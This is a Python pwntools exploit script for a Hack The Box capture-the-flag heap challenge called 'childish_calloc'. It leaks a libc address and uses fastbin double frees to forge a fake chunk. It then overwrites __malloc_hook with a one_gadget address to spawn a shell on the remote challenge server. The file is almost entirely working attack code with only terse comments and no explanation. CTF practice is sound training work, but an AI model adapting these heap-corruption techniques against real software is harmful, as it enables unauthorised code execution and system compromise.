from pwn import *

# Overwrite main arena top chunk pointer

p=None
if args.LOCAL:
    p = process('./childish_calloc', env={"LD_PRELOAD" : "./libc.so.6"})
else:
    p = remote('docker.hackthebox.eu', 32407)

context.terminal = ['gnome-terminal', '-e']
if args.GDB:
    gdb.attach(p)

prm = 'Choice:'
def rprm():
    p.recvuntil(prm)

def rcol():
    p.recvuntil(':')

def alloc(idx, sz, data):
    rprm()
    p.sendline('1')
    rcol()
    p.sendline(str(idx))
    rcol()
    p.sendline(str(sz))
    rcol()
    p.send(data)


def free(idx, shell = False):
    rprm()
    p.sendline('2')
    rcol()
    p.sendline(str(idx))
    if shell:
        p.interactive()
    rcol()
    p.sendline('100')

def realloc(idx, sz,data):
    rprm()
    p.sendline('2')
    rcol()
    p.sendline(str(idx))
    rcol()
    p.sendline(str(sz))
    p.interactive()



def show(idx):
    rprm()
    p.sendline('3')
    rcol()
    p.sendline(str(idx))
    data = p.recvline().strip()
    return data

def big_alloc(sz):
    rprm()
    p.sendline('4')
    rcol()
    p.sendline(str(sz))

alloc(0, 0x20, "A"*4)
alloc(1, 0x20, "B"*4)
alloc(2, 0x20, "C"*4)
alloc(3, 0x20, "A"*4)

free(0)
free(1)

big_alloc(0x600)

libc = ELF('./libc.so.6')
offset = 0x3ebcf0

leak = u64(show(0).ljust(8, b'\x00'))
log.success(hex(leak))

libc.address = leak - offset
log.success(hex(libc.address))

free(2)
free(3)
free(2)

malloc_hook =libc.symbols["__malloc_hook"]
free_hook =libc.symbols["__free_hook"]
top_chunk_ptr = leak - 0x70

log.info('malloc hook {}'.format(hex(malloc_hook)))
log.info(hex(free_hook))
log.info(hex(top_chunk_ptr))

# fake chunk of
fk_chunk = top_chunk_ptr-0x30
log.info(hex(fk_chunk))

alloc(4, 0x20, p64(0x41)) # 2
alloc(5, 0x20, "X"*4) # 3
alloc(6, 0x20, "Y"*4) # 2

alloc(7, 0x38, "Z"*4)
alloc(8, 0x38, "K"*4)
free(7)
free(8)
free(7)

alloc(9, 0x38, p64(fk_chunk))
alloc(10, 0x38, "A")
alloc(11, 0x38, "B")

alloc(12, 0x38, p64(fk_chunk+0x10) + p64(0x41))
alloc(13, 0x38, b"A"*0x30 + p64(malloc_hook-0x15))
log.info("try one gadget")
gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
g=libc.address + gadgets[1]
alloc(14, 0x38, b"A"*5 + p64(g))

realloc(0, 0x28, "A"*10)

p.interactive()
